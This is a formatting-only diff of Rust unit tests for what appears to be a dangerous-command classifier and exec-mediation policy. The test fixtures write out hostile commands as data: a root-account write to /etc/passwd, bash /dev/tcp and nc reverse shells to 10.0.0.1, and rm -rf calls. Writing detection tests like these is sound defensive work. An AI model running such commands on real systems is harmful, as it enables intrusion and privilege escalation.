@@ -26794,7 +26794,10 @@ mod tests {
     fn classify_etc_passwd_write() {
         let classes = classify_dangerous_command(
             "bash",
-            &["-c".into(), "echo 'hacker:x:0:0::/root:/bin/bash' | tee /etc/passwd".into()],
+            &[
+                "-c".into(),
+                "echo 'hacker:x:0:0::/root:/bin/bash' | tee /etc/passwd".into(),
+            ],
         );
         assert!(classes.contains(&DangerousCommandClass::CredentialFileModification));
     }
@@ -26809,7 +26812,12 @@ mod tests {
     fn classify_reverse_shell_bash() {
         let classes = classify_dangerous_command(
             "bash",
-            &["-i".into(), ">&".into(), "/dev/tcp/10.0.0.1/4242".into(), "0>&1".into()],
+            &[
+                "-i".into(),
+                ">&".into(),
+                "/dev/tcp/10.0.0.1/4242".into(),
+                "0>&1".into(),
+            ],
         );
         // The full command string contains "/dev/tcp/" and "bash"
         assert!(classes.contains(&DangerousCommandClass::ReverseShell));
@@ -26819,7 +26827,12 @@ mod tests {
     fn classify_reverse_shell_nc() {
         let classes = classify_dangerous_command(
             "nc",
-            &["-e".into(), "/bin/sh".into(), "10.0.0.1".into(), "4242".into()],
+            &[
+                "-e".into(),
+                "/bin/sh".into(),
+                "10.0.0.1".into(),
+                "4242".into(),
+            ],
         );
         assert!(classes.contains(&DangerousCommandClass::ReverseShell));
     }
@@ -26927,11 +26940,7 @@ mod tests {
             allow_patterns: vec!["rm -rf /tmp/build".to_string()],
             ..Default::default()
         };
-        let result = evaluate_exec_mediation(
-            &policy,
-            "rm",
-            &["-rf".into(), "/tmp/build".into()],
-        );
+        let result = evaluate_exec_mediation(&policy, "rm", &["-rf".into(), "/tmp/build".into()]);
         assert_eq!(result, ExecMediationResult::Allow);
     }
 
@@ -26952,11 +26961,7 @@ mod tests {
             allow_patterns: vec!["rm -rf /tmp/cache".to_string()],
             ..Default::default()
         };
-        let result = evaluate_exec_mediation(
-            &policy,
-            "rm",
-            &["-rf".into(), "/tmp/cache".into()],
-        );
+        let result = evaluate_exec_mediation(&policy, "rm", &["-rf".into(), "/tmp/cache".into()]);
         assert_eq!(result, ExecMediationResult::Allow);
     }
 
@@ -27162,10 +27167,7 @@ mod tests {
     fn extension_policy_permissive_profile_permissive_exec_mediation() {
         let policy = PolicyProfile::Permissive.to_policy();
         assert!(policy.exec_mediation.enabled);
-        assert_eq!(
-            policy.exec_mediation.deny_threshold,
-            ExecRiskTier::Critical
-        );
+        assert_eq!(policy.exec_mediation.deny_threshold, ExecRiskTier::Critical);
     }
 
     #[test]
@@ -27173,14 +27175,8 @@ mod tests {
         let policy = ExtensionPolicy::default();
         let json = serde_json::to_string(&policy).expect("serialize");
         let back: ExtensionPolicy = serde_json::from_str(&json).expect("deserialize");
-        assert_eq!(
-            back.exec_mediation.enabled,
-            policy.exec_mediation.enabled
-        );
-        assert_eq!(
-            back.secret_broker.enabled,
-            policy.secret_broker.enabled
-        );
+        assert_eq!(back.exec_mediation.enabled, policy.exec_mediation.enabled);
+        assert_eq!(back.secret_broker.enabled, policy.secret_broker.enabled);
     }
 
     #[test]
